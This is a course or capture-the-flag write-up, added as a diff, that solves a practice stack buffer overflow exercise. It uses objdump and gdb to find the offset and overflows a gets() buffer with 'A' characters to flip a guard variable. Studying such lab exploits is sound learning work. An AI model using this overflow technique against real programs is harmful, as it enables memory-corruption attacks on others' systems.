@@ -1,0 +1,96 @@
+Name of this question is stackoverwrite which hints us on stack buffer overflow
+let's objdump to see all functions
+
+amritesh@MyUbuntu:~/week8/week-8$ objdump -d pwn1-stackoverwrite -M intel
+
+080483f4 <main>:
+ 80483f4:	55                   	push   ebp
+ 80483f5:	89 e5                	mov    ebp,esp
+ 80483f7:	83 e4 f0             	and    esp,0xfffffff0
+ 80483fa:	83 ec 60             	sub    esp,0x60
+ 80483fd:	c7 44 24 5c 00 00 00 	mov    DWORD PTR [esp+0x5c],0x0
+ 8048404:	00
+ 8048405:	8d 44 24 1c          	lea    eax,[esp+0x1c]
+ 8048409:	89 04 24             	mov    DWORD PTR [esp],eax
+ 804840c:	e8 fb fe ff ff       	call   804830c <gets@plt>
+ 8048411:	8b 44 24 5c          	mov    eax,DWORD PTR [esp+0x5c]
+ 8048415:	85 c0                	test   eax,eax
+ 8048417:	74 0e                	je     8048427 <main+0x33>
+ 8048419:	c7 04 24 00 85 04 08 	mov    DWORD PTR [esp],0x8048500
+ 8048420:	e8 07 ff ff ff       	call   804832c <puts@plt>
+ 8048425:	eb 0c                	jmp    8048433 <main+0x3f>
+ 8048427:	c7 04 24 29 85 04 08 	mov    DWORD PTR [esp],0x8048529
+ 804842e:	e8 f9 fe ff ff       	call   804832c <puts@plt>
+ 8048433:	c9                   	leave
+ 8048434:	c3                   	ret
+
+there is variable declared and initialised with 0
+80483fd: c7 44 24 5c 00 00 00  mov    DWORD PTR [esp+0x5c],0x0  // let's name it variable
+
+then it is taking input
+	8048409: 89 04 24              mov    DWORD PTR [esp],eax
+	804840c: e8 fb fe ff ff        call   804830c <gets@plt>
+
+let's use gdb to see the value puts is printing
+(gdb) x/s 0x8048500
+0x8048500:	"you have changed the 'modified' variable"
+
+(gdb) x/s 0x8048529
+0x8048529:	"Try again?"
+
+so there is a condition on variable 
+if(variable==0)
+{
+	  8048427: c7 04 24 29 85 04 08  mov    DWORD PTR [esp],0x8048529
+	  804842e: e8 f9 fe ff ff        call   804832c <puts@plt> // Try again?
+}
+else{
+		8048419:	c7 04 24 00 85 04 08 	mov    DWORD PTR [esp],0x8048500
+		8048420:	e8 07 ff ff ff       	call   804832c <puts@plt> // you have changed the 'modified' variable
+}
+
+
+as given variable = 0
+but we have to make it non 0 as we have to print "you have changed the 'modified' variable"
+
+so let's use buffer overflow concept as there is gets function which is vulnerable to this attack
+ we'll increase the sizeof stack so that it overflows to reach the variable adress  and modifies it
+
+ let's use gdb for it
+
+ i'll give breakpoint after gets so that we'll get to know what happened to stack
+
+ (gdb) break *0x08048411
+ Breakpoint 1 at 0x8048411: file stack0/stack0.c, line 13.
+
+now i'll run it by giving some random string and see the stack values
+(gdb) run
+Starting program: /home/amritesh/week8/week-8/pwn1-stackoverwrite
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint 1, main (argc=1, argv=0xffffcde4) at stack0/stack0.c:13
+13	stack0/stack0.c: No such file or directory.
+(gdb) x/30x $esp
+0xffffcce0:	0xffffccfc	0x00000000	0x00000000	0x0da5bf00
+0xffffccf0:	0x00000007	0xffffcfea	0xf7e034a9	0x41414141
+0xffffcd00:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd10:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd20:	0x00004141	0xf7e035db	0xf7ffd000	0xf7e036a5
+0xffffcd30:	0xf7fe59b0	0x00000000	0x0804845b	0x00000000
+0xffffcd40:	0xf7fab000	0xf7fab000	0x00000000	0xf7debe81
+0xffffcd50:	0x00000001	0xffffcde4
+
+now let's see address and value of our variable
+(gdb) x $esp+0x5c
+0xffffcd3c:	0x00000000
+
+so basically we have to give 65-68 strings to run stack bufferoverflow successfully
+
+let's see..
+
+amritesh@MyUbuntu:~/week8/week-8$ ./pwn1-stackoverwrite
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+you have changed the 'modified' variable
+
+yeah we did it...
+
